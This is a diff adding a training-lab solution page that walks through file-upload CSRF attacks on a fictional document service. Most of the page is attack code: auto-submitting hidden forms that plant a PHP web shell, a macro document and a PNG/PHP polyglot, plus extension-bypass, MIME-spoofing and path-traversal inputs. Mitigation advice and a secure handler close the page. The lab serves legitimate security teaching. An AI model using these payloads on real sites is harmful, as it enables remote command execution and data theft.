@@ -1,0 +1,389 @@
+{% extends 'base.html' %}
+
+{% block title %}CSRF Level 4 Solution - R00tGlyph{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-10 offset-md-1">
+        <div class="card">
+            <div class="card-header">
+                <h2 class="text-center">
+                    <i class="bi bi-lightbulb-fill me-2"></i>
+                    Level 4 Solution: File Upload CSRF - DocuShare Pro Attack
+                </h2>
+            </div>
+            <div class="card-body">
+                <div class="alert alert-info">
+                    <h4><i class="bi bi-info-circle-fill me-2"></i>Challenge Overview</h4>
+                    <p>This challenge demonstrates CSRF attacks against DocuShare Pro's file upload functionality. File upload CSRF attacks are particularly dangerous as they can lead to remote code execution, data exfiltration, and system compromise through malicious file uploads.</p>
+                </div>
+
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h4 class="mb-0"><i class="bi bi-tools me-2"></i>Tools Required</h4>
+                    </div>
+                    <div class="card-body">
+                        <p><strong>Primary Tools:</strong> Burp Suite, Browser Developer Tools, File manipulation tools</p>
+                        <p><strong>Skills:</strong> Multipart form crafting, File upload exploitation, MIME type manipulation</p>
+                        <p><strong>Payloads:</strong> Web shells, malicious documents, executable files, image-based attacks</p>
+                    </div>
+                </div>
+
+                <div class="card mb-4">
+                    <div class="card-header bg-warning text-dark">
+                        <h4 class="mb-0"><i class="bi bi-list-ol me-2"></i>Step-by-Step Solution</h4>
+                    </div>
+                    <div class="card-body">
+                        <ol>
+                            <li><strong>Analyze Upload Endpoint:</strong> Identify DocuShare Pro's file upload functionality and parameters</li>
+                            <li><strong>Test Upload Restrictions:</strong> Understand file type, size, and validation restrictions</li>
+                            <li><strong>Craft Malicious Files:</strong> Create files that bypass validation and contain malicious payloads</li>
+                            <li><strong>Build CSRF Form:</strong> Create multipart form that uploads malicious files</li>
+                            <li><strong>Bypass Validation:</strong> Use techniques to circumvent file type and content restrictions</li>
+                            <li><strong>Execute Attack:</strong> Trigger unauthorized file uploads through victim's browser</li>
+                        </ol>
+                        <div class="alert alert-warning mt-3">
+                            <strong>Key Insight:</strong> File upload CSRF can lead to immediate system compromise if the uploaded files are executed or processed by the server.
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h4 class="mb-0"><i class="bi bi-code-slash me-2"></i>File Upload CSRF Attack Payloads</h4>
+                    </div>
+                    <div class="card-body">
+                        <h5>1. Web Shell Upload Attack</h5>
+                        <pre class="bg-dark text-light p-3 rounded"><code>&lt;!-- Web Shell Upload via CSRF --&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;DocuShare Pro - Document Processor&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h2&gt;📄 Document Processing Service&lt;/h2&gt;
+    &lt;p&gt;Your document is being processed automatically...&lt;/p&gt;
+    
+    &lt;!-- Hidden malicious file upload form --&gt;
+    &lt;form id="csrf-upload" action="http://target.com/csrf/level4" method="post" 
+          enctype="multipart/form-data" style="display:none;"&gt;
+        
+        &lt;!-- Web shell disguised as image --&gt;
+        &lt;input type="file" name="document" id="malicious-file"&gt;
+        
+        &lt;!-- Additional form fields --&gt;
+        &lt;input type="text" name="document_type" value="system_config"&gt;
+        &lt;input type="text" name="folder" value="public/uploads/"&gt;
+        &lt;input type="text" name="description" value="System backup file"&gt;
+        &lt;input type="checkbox" name="public_access" checked&gt;
+    &lt;/form&gt;
+    
+    &lt;!-- Progress indicator to keep user engaged --&gt;
+    &lt;div id="progress"&gt;
+        &lt;div style="background:#f0f0f0;width:100%;height:20px;border-radius:10px;"&gt;
+            &lt;div id="progress-bar" style="background:#4CAF50;height:20px;width:0%;border-radius:10px;transition:width 0.5s;"&gt;&lt;/div&gt;
+        &lt;/div&gt;
+        &lt;p id="status"&gt;Initializing...&lt;/p&gt;
+    &lt;/div&gt;
+    
+    &lt;script&gt;
+    // Create malicious PHP web shell
+    function createMaliciousFile() {
+        var webShellContent = `&lt;?php
+            // Simple web shell
+            if(isset($_GET['cmd'])) {
+                system($_GET['cmd']);
+            }
+            if(isset($_GET['file'])) {
+                readfile($_GET['file']);
+            }
+            echo '&lt;form method="GET"&gt;';
+            echo '&lt;input name="cmd" placeholder="Command"&gt;';
+            echo '&lt;input type="submit" value="Execute"&gt;';
+            echo '&lt;/form&gt;';
+        ?&gt;`;
+        
+        // Create blob with web shell content
+        var blob = new Blob([webShellContent], {type: 'image/png'});
+        var file = new File([blob], 'backup.png.php', {type: 'image/png'});
+        
+        // Set the file to the hidden input
+        var fileInput = document.getElementById('malicious-file');
+        var dt = new DataTransfer();
+        dt.items.add(file);
+        fileInput.files = dt.files;
+        
+        return true;
+    }
+    
+    // Simulate processing progress
+    function simulateProgress() {
+        var progress = 0;
+        var statusMessages = [
+            'Initializing document upload...',
+            'Validating file format...',
+            'Processing document content...',
+            'Uploading to server...',
+            'Finalizing upload...'
+        ];
+        
+        var interval = setInterval(function() {
+            progress += 20;
+            document.getElementById('progress-bar').style.width = progress + '%';
+            document.getElementById('status').textContent = statusMessages[Math.floor(progress/20) - 1] || 'Complete';
+            
+            if (progress >= 100) {
+                clearInterval(interval);
+                // Execute the actual CSRF attack
+                if (createMaliciousFile()) {
+                    document.getElementById('csrf-upload').submit();
+                }
+            }
+        }, 1000);
+    }
+    
+    // Start attack on page load
+    window.onload = function() {
+        setTimeout(simulateProgress, 500);
+    };
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+
+                        <h5 class="mt-4">2. Malicious Document Upload</h5>
+                        <pre class="bg-dark text-light p-3 rounded"><code>&lt;!-- Malicious Office Document Upload --&gt;
+&lt;html&gt;
+&lt;body&gt;
+    &lt;h2&gt;DocuShare Pro - Automated Backup Service&lt;/h2&gt;
+    &lt;p&gt;Backing up your important documents...&lt;/p&gt;
+    
+    &lt;form id="doc-upload" action="http://target.com/csrf/level4" method="post" 
+          enctype="multipart/form-data" style="display:none;"&gt;
+        &lt;input type="file" name="document" id="doc-file"&gt;
+        &lt;input type="text" name="document_type" value="macro_enabled"&gt;
+        &lt;input type="text" name="auto_process" value="true"&gt;
+    &lt;/form&gt;
+    
+    &lt;script&gt;
+    // Create malicious macro-enabled document
+    function createMaliciousDoc() {
+        // Base64 encoded malicious Word document with macro
+        var maliciousDocB64 = 'UEsDBBQAAAAIAO... [truncated base64 content] ...';
+        
+        // Convert base64 to blob
+        var byteCharacters = atob(maliciousDocB64);
+        var byteNumbers = new Array(byteCharacters.length);
+        for (var i = 0; i &lt; byteCharacters.length; i++) {
+            byteNumbers[i] = byteCharacters.charCodeAt(i);
+        }
+        var byteArray = new Uint8Array(byteNumbers);
+        var blob = new Blob([byteArray], {type: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document'});
+        
+        var file = new File([blob], 'important_document.docm', {
+            type: 'application/vnd.ms-word.document.macroEnabled.12'
+        });
+        
+        var fileInput = document.getElementById('doc-file');
+        var dt = new DataTransfer();
+        dt.items.add(file);
+        fileInput.files = dt.files;
+        
+        return true;
+    }
+    
+    // Execute upload
+    window.onload = function() {
+        setTimeout(function() {
+            if (createMaliciousDoc()) {
+                document.getElementById('doc-upload').submit();
+            }
+        }, 2000);
+    };
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+
+                        <h5 class="mt-4">3. Image-based Attack (Polyglot Files)</h5>
+                        <pre class="bg-dark text-light p-3 rounded"><code>&lt;!-- Polyglot Image/Script Upload --&gt;
+&lt;html&gt;
+&lt;body&gt;
+    &lt;h2&gt;DocuShare Pro - Image Gallery Sync&lt;/h2&gt;
+    
+    &lt;form id="img-upload" action="http://target.com/csrf/level4" method="post" 
+          enctype="multipart/form-data" style="display:none;"&gt;
+        &lt;input type="file" name="document" id="img-file"&gt;
+        &lt;input type="text" name="document_type" value="profile_image"&gt;
+        &lt;input type="text" name="public_access" value="true"&gt;
+    &lt;/form&gt;
+    
+    &lt;script&gt;
+    function createPolyglotFile() {
+        // Create a file that is both a valid image and executable script
+        var polyglotContent = 
+            // PNG header to pass image validation
+            '\x89PNG\r\n\x1a\n' +
+            // Minimal PNG chunks
+            '\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde' +
+            '\x00\x00\x00\tpHYs\x00\x00\x0b\x13\x00\x00\x0b\x13\x01\x00\x9a\x9c\x18' +
+            // Embedded PHP code in PNG comment
+            '\x00\x00\x00\x32tEXt' +
+            'comment\x00&lt;?php system($_GET["c"]); ?&gt;' +
+            '\x00\x00\x00\x00IEND\xaeB`\x82';
+            
+        var blob = new Blob([polyglotContent], {type: 'image/png'});
+        var file = new File([blob], 'avatar.png', {type: 'image/png'});
+        
+        var fileInput = document.getElementById('img-file');
+        var dt = new DataTransfer();
+        dt.items.add(file);
+        fileInput.files = dt.files;
+        
+        return true;
+    }
+    
+    window.onload = function() {
+        setTimeout(function() {
+            if (createPolyglotFile()) {
+                document.getElementById('img-upload').submit();
+            }
+        }, 1500);
+    };
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+                    </div>
+                </div>
+
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h4 class="mb-0"><i class="bi bi-gear-fill me-2"></i>Advanced File Upload Attack Techniques</h4>
+                    </div>
+                    <div class="card-body">
+                        <h5>1. Extension Bypass Techniques</h5>
+                        <pre class="bg-dark text-light p-2 rounded"><code>// Various extension bypass methods
+var bypassExtensions = [
+    'shell.php.png',      // Double extension
+    'shell.php%00.png',   // Null byte injection
+    'shell.php.png.php',  // Multiple extensions
+    'shell.pHP',          // Case variation
+    'shell.php5',         // Alternative extensions
+    'shell.phtml',        // Alternative PHP extension
+    'shell.php.',         // Trailing dot
+    'shell.php::$DATA'    // NTFS ADS (Windows)
+];</code></pre>
+
+                        <h5 class="mt-3">2. MIME Type Spoofing</h5>
+                        <pre class="bg-dark text-light p-2 rounded"><code>// Create file with spoofed MIME type
+var maliciousFile = new File([maliciousContent], 'image.jpg', {
+    type: 'image/jpeg'  // Claims to be image but contains script
+});
+
+// Alternative: Use legitimate image magic bytes
+var spoofedContent = 
+    '\xFF\xD8\xFF\xE0' +  // JPEG magic bytes
+    '&lt;?php system($_GET["cmd"]); ?&gt;';</code></pre>
+
+                        <h5 class="mt-3">3. Directory Traversal in Upload</h5>
+                        <pre class="bg-dark text-light p-2 rounded"><code>&lt;!-- Attempt directory traversal --&gt;
+&lt;input type="text" name="folder" value="../../../var/www/html/"&gt;
+&lt;input type="text" name="filename" value="../../public/shell.php"&gt;
+
+&lt;!-- URL encoded traversal --&gt;
+&lt;input type="text" name="path" value="%2e%2e%2f%2e%2e%2fpublic%2fshell.php"&gt;</code></pre>
+                    </div>
+                </div>
+
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h4 class="mb-0"><i class="bi bi-shield-exclamation me-2"></i>Security Impact</h4>
+                    </div>
+                    <div class="card-body">
+                        <p>File Upload CSRF vulnerabilities in DocuShare Pro can lead to:</p>
+                        <ul>
+                            <li><strong>Remote Code Execution:</strong> Upload and execute web shells for complete system control</li>
+                            <li><strong>Data Exfiltration:</strong> Access and steal sensitive documents and user data</li>
+                            <li><strong>Malware Distribution:</strong> Upload malicious files that infect other users</li>
+                            <li><strong>Privilege Escalation:</strong> Gain administrative access through uploaded backdoors</li>
+                            <li><strong>Service Disruption:</strong> Upload large files to consume disk space and crash services</li>
+                            <li><strong>Compliance Violations:</strong> Introduce unauthorized content that violates regulatory requirements</li>
+                        </ul>
+                        <div class="alert alert-danger mt-3">
+                            <strong>Critical Risk:</strong> File upload CSRF represents one of the highest-impact vulnerability classes, often providing immediate remote code execution capabilities.
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h4 class="mb-0"><i class="bi bi-shield-check me-2"></i>Mitigation Strategies</h4>
+                    </div>
+                    <div class="card-body">
+                        <h5>Primary Defenses:</h5>
+                        <ul>
+                            <li><strong>CSRF Tokens:</strong> Implement strong anti-CSRF tokens in all upload forms</li>
+                            <li><strong>Origin Validation:</strong> Strictly validate Origin and Referer headers</li>
+                            <li><strong>Authentication:</strong> Require explicit user authentication for file uploads</li>
+                        </ul>
+                        
+                        <h5>File Upload Security:</h5>
+                        <ul>
+                            <li><strong>File Type Validation:</strong> Whitelist allowed file extensions and MIME types</li>
+                            <li><strong>Content Scanning:</strong> Scan uploaded files for malicious content</li>
+                            <li><strong>File Size Limits:</strong> Enforce strict file size limitations</li>
+                            <li><strong>Filename Sanitization:</strong> Remove dangerous characters from filenames</li>
+                            <li><strong>Upload Directory Security:</strong> Store uploads outside web root</li>
+                            <li><strong>Execution Prevention:</strong> Disable script execution in upload directories</li>
+                        </ul>
+
+                        <h5>Advanced Protections:</h5>
+                        <ul>
+                            <li><strong>Virus Scanning:</strong> Integrate real-time antivirus scanning</li>
+                            <li><strong>Sandboxing:</strong> Process uploads in isolated environments</li>
+                            <li><strong>Content-Type Enforcement:</strong> Validate actual file content matches declared type</li>
+                            <li><strong>Rate Limiting:</strong> Limit upload frequency per user/IP</li>
+                        </ul>
+
+                        <div class="alert alert-success mt-3">
+                            <strong>Secure Upload Implementation:</strong>
+                            <pre class="mt-2"><code>// Secure file upload handler
+app.post('/upload', [
+    validateCSRFToken,
+    validateOrigin,
+    authenticateUser,
+    upload.single('file')
+], (req, res) =&gt; {
+    // Validate file type
+    const allowedTypes = ['image/jpeg', 'image/png', 'application/pdf'];
+    if (!allowedTypes.includes(req.file.mimetype)) {
+        return res.status(400).json({error: 'Invalid file type'});
+    }
+    
+    // Scan for malicious content
+    if (containsMaliciousContent(req.file.buffer)) {
+        return res.status(400).json({error: 'Malicious content detected'});
+    }
+    
+    // Process securely...
+});</code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="text-center mt-4">
+                    <a href="/csrf/level3" class="btn btn-secondary me-2">
+                        <i class="bi bi-arrow-left me-1"></i>Previous Challenge
+                    </a>
+                    <a href="/csrf/level4" class="btn btn-primary me-2">
+                        <i class="bi bi-arrow-left me-1"></i>Back to Challenge
+                    </a>
+                    <a href="/csrf/level5" class="btn btn-success">
+                        <i class="bi bi-arrow-right me-1"></i>Next Challenge
+                    </a>
+                    <a href="/challenges" class="btn btn-info ms-2">
+                        <i class="bi bi-list me-1"></i>All Challenges
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
